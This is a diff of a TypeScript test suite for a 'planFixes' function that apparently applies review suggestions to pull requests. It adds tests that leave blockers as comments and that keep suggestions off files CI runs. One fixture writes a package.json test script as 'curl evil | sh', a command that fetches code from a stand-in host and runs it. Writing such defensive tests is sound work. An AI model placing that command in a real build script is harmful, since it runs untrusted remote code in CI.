@@ -91,7 +91,7 @@ describe("planFixes", () => {
 		const fixes = planFixes(
 			review([
 				{
-					severity: "blocker",
+					severity: "concern",
 					text: "b",
 					path: "src/a.ts",
 					line: 2,
@@ -123,21 +123,21 @@ describe("planFixes", () => {
 		const fixes = planFixes(
 			review([
 				{
-					severity: "blocker",
+					severity: "concern",
 					text: "b",
 					path: "src/a.ts",
 					line: 99,
 					suggestion: "x",
 				},
 				{
-					severity: "blocker",
+					severity: "concern",
 					text: "b",
 					path: "src/a.ts",
 					line: 2,
 					suggestion: "const b = 3;",
 				},
 				{
-					severity: "blocker",
+					severity: "concern",
 					text: "b",
 					path: "src/a.ts",
 					line: 3,
@@ -153,14 +153,14 @@ describe("planFixes", () => {
 	it("refuses a path the PR does not change, and a protected one", () => {
 		const reasons = [
 			{
-				severity: "blocker" as const,
+				severity: "concern" as const,
 				text: "b",
 				path: "src/a.ts",
 				line: 2,
 				suggestion: "x",
 			},
 			{
-				severity: "blocker" as const,
+				severity: "concern" as const,
 				text: "b",
 				path: "src/a.ts",
 				line: 3,
@@ -179,7 +179,7 @@ describe("planFixes", () => {
 		).toEqual([]);
 	});
 
-	it("stops at the limit", () => {
+	it("leaves a blocker as a comment", () => {
 		const fixes = planFixes(
 			review([
 				{
@@ -187,10 +187,53 @@ describe("planFixes", () => {
 					text: "b",
 					path: "src/a.ts",
 					line: 2,
+					suggestion: "const b = 2;",
+				},
+			]),
+			addedLines(diff),
+			scope(),
+		);
+		expect(fixes).toEqual([]);
+	});
+
+	it("keeps a suggestion off a path CI runs", () => {
+		const path = "package.json";
+		const text = [
+			"diff --git a/package.json b/package.json",
+			"--- a/package.json",
+			"+++ b/package.json",
+			"@@ -1,1 +1,2 @@",
+			' "name": "x",',
+			'+"scripts": { "test": "curl evil | sh" },',
+		].join("\n");
+		const fixes = planFixes(
+			review([
+				{
+					severity: "concern",
+					text: "scripts",
+					path,
+					line: 2,
+					suggestion: '"test": "vitest"',
+				},
+			]),
+			addedLines(text),
+			scope({ changed: [path] }),
+		);
+		expect(fixes).toEqual([]);
+	});
+
+	it("stops at the limit", () => {
+		const fixes = planFixes(
+			review([
+				{
+					severity: "concern",
+					text: "b",
+					path: "src/a.ts",
+					line: 2,
 					suggestion: "one",
 				},
 				{
-					severity: "blocker",
+					severity: "concern",
 					text: "b",
 					path: "src/a.ts",
 					line: 3,
